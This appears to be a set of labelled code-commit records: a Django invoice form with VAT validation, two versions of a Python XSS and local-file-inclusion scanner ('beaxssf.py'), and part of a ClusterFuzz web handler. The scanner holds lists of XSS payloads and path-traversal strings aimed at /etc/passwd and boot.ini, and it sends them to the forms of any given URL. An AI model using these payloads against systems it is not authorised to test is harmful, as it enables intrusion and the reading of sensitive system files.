            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),
            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),
            'internal_reference': forms.TextInput,
        }
        labels = {
            'is_business': ''
        }

    def __init__(self, *args, **kwargs):
        self.event = event = kwargs.pop('event')
        self.request = kwargs.pop('request', None)
        self.validate_vat_id = kwargs.pop('validate_vat_id')
        self.all_optional = kwargs.pop('all_optional', False)
        super().__init__(*args, **kwargs)
        if not event.settings.invoice_address_vatid:
            del self.fields['vat_id']

        if not event.settings.invoice_address_required or self.all_optional:
            for k, f in self.fields.items():
                f.required = False
                f.widget.is_required = False
                if 'required' in f.widget.attrs:
                    del f.widget.attrs['required']
        elif event.settings.invoice_address_company_required and not self.all_optional:
            self.initial['is_business'] = True

            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)
            self.fields['company'].required = True
            self.fields['company'].widget.is_required = True
            self.fields['company'].widget.attrs['required'] = 'required'
            del self.fields['company'].widget.attrs['data-display-dependency']
            if 'vat_id' in self.fields:
                del self.fields['vat_id'].widget.attrs['data-display-dependency']

        self.fields['name_parts'] = NamePartsFormField(
            max_length=255,
            required=event.settings.invoice_name_required and not self.all_optional,
            scheme=event.settings.name_scheme,
            label=_('Name'),
            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),
        )
        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:
            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'
            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'
            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'

        if not event.settings.invoice_address_beneficiary:
            del self.fields['beneficiary']

    def clean(self):
        data = self.cleaned_data
        if not data.get('is_business'):
            data['company'] = ''
        if self.event.settings.invoice_address_required:
            if data.get('is_business') and not data.get('company'):
                raise ValidationError(_('You need to provide a company name.'))
            if not data.get('is_business') and not data.get('name_parts'):
                raise ValidationError(_('You need to provide your name.'))

        if 'vat_id' in self.changed_data or not data.get('vat_id'):
            self.instance.vat_id_validated = False

        self.instance.name_parts = data.get('name_parts')

        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:
            pass
        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):
            if data.get('vat_id')[:2] != str(data.get('country')):
                raise ValidationError(_('Your VAT ID does not match the selected country.'))
            try:
                result = vat_moss.id.validate(data.get('vat_id'))
                if result:
                    country_code, normalized_id, company_name = result
                    self.instance.vat_id_validated = True
                    self.instance.vat_id = normalized_id
            except (vat_moss.errors.InvalidError, ValueError):
                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))
            except vat_moss.errors.WebServiceUnavailableError:
                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))
                self.instance.vat_id_validated = False
                if self.request and self.vat_warning:
                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '
                                                     'your country is currently not available. We will therefore '
                                                     'need to charge VAT on your invoice. You can get the tax amount '
                                                     'back via the VAT reimbursement process.'))
            except vat_moss.errors.WebServiceError:
                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))
                self.instance.vat_id_validated = False
                if self.request and self.vat_warning:
                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '
                                                     'your country returned an incorrect result. We will therefore '
                                                     'need to charge VAT on your invoice. Please contact support to '
                                                     'resolve this manually.'))
        else:
            self.instance.vat_id_validated = False


class BaseInvoiceNameForm(BaseInvoiceAddressForm):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for f in list(self.fields.keys()):
            if f != 'name':
                del self.fields[f]
/n/n/n",1
52,73d12b579a488013c561179bb95b1d45c2b48e2f,"scripts/beaxssf.py/n/n#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ ""<script>alert(1);</script>"", ""<script>prompt(1)</script>"",
                ""<img src=x onerror=prompt(/test/)>"",
                ""\""><script>alert(1);</script><div id=\""x"", ""</script><script>alert(1);</script>"",
                ""</title><script>alert(1);</script>"", ""<body background=\""javascript:alert(1)\"">"",
                ""<img src=test123456.jpg onerror=alert(1)>""]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] XSS check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print ""[+] Target is VULNERABLE""
            print ""Url: "" + url
            print ""Parameters: %s\n"" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] LFI check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print ""[+] Target is VULNERABLE""
                print ""Url: "" + url
                print ""Parameters: %s\n"" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url, scanopt):
    print ""[+] Start scan""
    rtype=""""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = """"
    form_counter = 0

    try:
        with open(fname, ""r"") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find(""</form>"") >=0:
                    has_form=0
                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):
                        if scanopt.find(""--checkxss"") == 0 or scanopt.find(""--all"") == 0:
                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        if scanopt.find(""--checklfi"") == 0 or scanopt.find(""--all"") == 0:
                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=[""\'](\w+)[""\']', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=[""\'](\w+)[""\']', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=[""\']([\w\/\.\-\#\:]+)[""\']', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=[""\']([\w\/\.\-]+)[""\']', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""""
                    else:
                        page=m_action.group(1)
                    rtype=""get""
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print ""[+] Form detected. Method "" + rtype.upper()

    except Exception, e:
        print ""[-] scan_for_forms(): Error "" + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def help():
    print ""--checkxss\t\tcheck webpage for XSS vunerabilities""
    print ""--checklfi\t\tcheck webpage for local file inclusion (LFI) vulnerabilities""
    print ""--all\t\t\tthe tool will scan for both XSS and LFI vulnerabilities (default)""
    print ""\nExamples:""
    print ""program http://example.com/guestbook\t\t\tit will check for both XSS and LFI""
    print ""program --checkxss http://example.com/guestbook\t\tit will check only for XSS""

###MAIN###
if __name__ == ""__main__"":
    print ""BEstAutomaticXSSFinder v1.0""
    print ""DISCLAIMER: For testing purposes only!\n""

    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print ""program [scan options] [url]\n""
        help()
        exit()

    scanopt =""--all""
    url = """"
    
    if sys.argv[1].find(""http"") == 0:
        url = sys.argv[1]
        if len(sys.argv) == 3:
            scanopt = sys.argv[2]
    else:
        if len(sys.argv) == 3:
            if sys.argv[1].find(""--check"") == 0:
                scanopt = sys.argv[1]
                url = sys.argv[2]

    if url.find(""http"") != 0:
        print ""[-] Invalid target""
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print ""[-] Can't get host information""
        exit()

    print ""[+] Host acquired "" + host
    print ""[+] Retrieve page""
    try:
        r = requests.get(url)
        s = r.content.replace("">"", "">\n"")

        #good to have a local copy for testing
        with open(""tmpage.txt"", ""w"") as f:
            f.write(s)

        scan_for_forms(""tmpage.txt"", host, url, scanopt)
        if DEBUG == 0:
            os.remove(""tmpage.txt"")
    except Exception, e:
        print ""[-] Main(): Error "" + str(e)

print ""[*] Done""
/n/n/n",0
53,73d12b579a488013c561179bb95b1d45c2b48e2f,"/scripts/beaxssf.py/n/n#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ ""<script>alert(1);</script>"", ""<img src=x onerror=prompt(/test/)>"",
                ""\""><script>alert(1);</script><div id=\""x"", ""</script><script>alert(1);</script>"",
                ""</title><script>alert(1);</script>"", ""<body background=\""javascript:alert(1)\"">"",
                ""<img src=test123456.jpg onerror=alert(1)>""]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] XSS check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print ""[+] Target is VULNERABLE""
            print ""Url: "" + url
            print ""Parameters: %s\n"" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] LFI check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print ""[+] Target is VULNERABLE""
                print ""Url: "" + url
                print ""Parameters: %s\n"" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url):
    print ""[+] Start scan""
    rtype=""""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = """"
    form_counter = 0
    try:
        with open(fname, ""r"") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find(""</form>"") >=0:
                    has_form=0
                    if len(page) > 0 and len(params) > 0:
                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=""(\w+)""', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=""(\w+)""', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>""', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=""([\w\/\.\-\#\:]+)""', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=""([\w\/\.\-]+)""', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""""
                    else:
                        page=m_action.group(1)
                    rtype=""get""
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print ""[+] Form detected. Method "" + rtype.upper()

    except Exception, e:
        print ""[-] scan_for_forms(): Error "" + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def banner():
    print ""BEstAutomaticXSSFinder v1.0""
    print ""DISCLAIMER: For testing purposes only!\n""

###MAIN###
if __name__ == ""__main__"":
    banner()

    if len(sys.argv) != 2:
        print ""program [url]""
        exit()

    url = sys.argv[1]
    if url.find(""http"") != 0:
        print ""[-] Invalid target""
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print ""[-] Can't get host information""
        exit()

    print ""[+] Host acquired "" + host
    print ""[+] Retrieve page""
    try:
        r = requests.get(url)
        s = r.content.replace("">"", "">\n"")

        #good to have a local copy for testing
        with open(""tmpage.txt"", ""w"") as f:
            f.write(s)

        scan_for_forms(""tmpage.txt"", host, url)
        os.remove(""tmpage.txt"")
    except Exception, e:
        print ""[-] Main(): Error "" + str(e)

print ""[*] Done""
/n/n/n",1
54,3d66c1146550eecd4e34d47332a8616b435a21fe,"src/appengine/handlers/base_handler.py/n/n# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""The superclass of all handlers.""""""

from builtins import object
from future import standard_library
standard_library.install_aliases()
import base64
import cgi
import datetime
import json
import logging
import os
import re
import sys
import traceback
import urllib.parse

import jinja2
import webapp2

from base import utils
from config import db_config
from config import local_config
from datastore import ndb
from google_cloud_utils import storage
from libs import auth
from libs import form
from libs import helpers
from system import environment

# Pattern from
# https://github.com/google/closure-library/blob/
# 3037e09cc471bfe99cb8f0ee22d9366583a20c28/closure/goog/html/safeurl.js
_SAFE_URL_PATTERN = re.compile(
    r'^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))', flags=re.IGNORECASE)


def add_jinja2_filter(name, fn):
  _JINJA_ENVIRONMENT.filters[name] = fn


class JsonEncoder(json.JSONEncoder):
  """"""Json encoder.""""""
  _EPOCH = datetime.datetime.utcfromtimestamp(0)

  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden
    if isinstance(obj, ndb.Model):
      dict_obj = obj.to_dict()
      dict_obj['id'] = obj.key.id()
      return dict_obj
    elif isinstance(obj, datetime.datetime):
      return int((obj - self._EPOCH).total_seconds())
    elif hasattr(obj, 'to_dict'):
      return obj.to_dict()
    elif isinstance(obj, cgi.FieldStorage):
      return str(obj)
    else:
      raise Exception('Cannot serialise %s' % obj)


def format_time(dt):
  """"""Format datetime object for display.""""""
  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)


def splitlines(text):
  """"""Split text into lines.""""""
  return text.splitlines()


def split_br(text):
  return re.split(r'\s*<br */>\s*', text, flags=re.IGNORECASE)


def encode_json(value):
  """"""Dump base64-encoded JSON string (to avoid XSS).""""""
  return base64.b64encode(json.dumps(value, cls=JsonEncoder))


_JINJA_ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(
        os.path.join(os.path.dirname(__file__), '..', 'templates')),
    extensions=['jinja2.ext.autoescape'],
    autoescape=True)
_MENU_ITEMS = []

add_jinja2_filter('json', encode_json)
add_jinja2_filter('format_time', format_time)
add_jinja2_filter('splitlines', splitlines)
add_jinja2_filter('split_br', split_br)
add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)


def add_menu(name, href):
  """"""Add menu item to the main navigation.""""""
  _MENU_ITEMS.append(_MenuItem(name, href))


def make_login_url(dest_url):
  """"""Make the switch account url.""""""
  return '/login?' + urllib.parse.urlencode({'dest': dest_url})


def make_logout_url(dest_url):
  """"""Make the switch account url.""""""
  return '/logout?' + urllib.parse.urlencode({
      'csrf_token': form.generate_csrf_token(),
      'dest': dest_url,
  })


def check_redirect_url(url):
  """"""Check redirect URL is safe.""""""
  if not _SAFE_URL_PATTERN.match(url):
    raise helpers.EarlyExitException('Invalid redirect.', 403)


class _MenuItem(object):
  """"""A menu item used for rendering an item in the main navigation.""""""

  def __init__(self, name, href):
    self.name = name
    self.href = href


class Handler(webapp2.RequestHandler):
  """"""A superclass for all handlers. It contains many convenient methods.""""""

  def is_cron(self):
    """"""Return true if the request is from a cron job.""""""
    return bool(self.request.headers.get('X-Appengine-Cron'))

  def render_forbidden(self, message):
    """"""Write HTML response for 403.""""""
    login_url = make_login_url(dest_url=self.request.url)
    user_email = helpers.get_user_email()
    if not user_email:
      self.redirect(login_url)
      return

    contact_string = db_config.get_value('contact_string')
    template_values = {
        'message': message,
        'user_email': helpers.get_user_email(),
        'login_url': login_url,
        'switch_account_url': login_url,
        'logout_url': make_logout_url(dest_url=self.request.url),
        'contact_string': contact_string,
    }
    self.render('error-403.html', template_values, 403)

  def _add_security_response_headers(self):
    """"""Add security-related headers to response.""""""
    self.response.headers['Strict-Transport-Security'] = (
        'max-age=2592000; includeSubdomains')
    self.response.headers['X-Content-Type-Options'] = 'nosniff'
    self.response.headers['X-Frame-Options'] = 'deny'

  def render(self, path, values=None, status=200):
    """"""Write HTML response.""""""
    if values is None:
      values = {}

    values['menu_items'] = _MENU_ITEMS
    values['is_oss_fuzz'] = utils.is_oss_fuzz()
    values['is_development'] = (
        environment.is_running_on_app_engine_development())
    values['is_logged_in'] = bool(helpers.get_user_email())

    # Only track analytics for non-admin users.
    values['ga_tracking_id'] = (
        local_config.GAEConfig().get('ga_tracking_id')
        if not auth.is_current_user_admin() else None)

    if values['is_logged_in']:
      values['switch_account_url'] = make_login_url(self.request.url)
      values['logout_url'] = make_logout_url(dest_url=self.request.url)

